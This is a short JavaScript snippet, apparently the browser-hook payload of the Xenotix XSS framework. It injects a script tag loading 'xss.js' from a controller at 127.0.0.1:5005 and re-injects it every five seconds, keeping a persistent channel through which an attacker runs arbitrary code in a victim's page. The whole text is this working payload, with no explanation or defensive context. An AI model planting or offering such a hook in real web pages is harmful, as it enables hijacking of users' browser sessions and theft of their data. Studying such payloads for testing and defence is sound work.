function js_reload(){if (document.getElementById('xenotix_xss') != null)document.body.removeChild(document.getElementById('xenotix_xss')); 
script = document.createElement('script');script.id = 'xenotix_xss';script.src ='http://127.0.0.1:5005/xss.js'; 
document.body.appendChild(script);}if (typeof(init) != 'undefined')clearInterval(init);init = setInterval(js_reload, 5000); js_reload()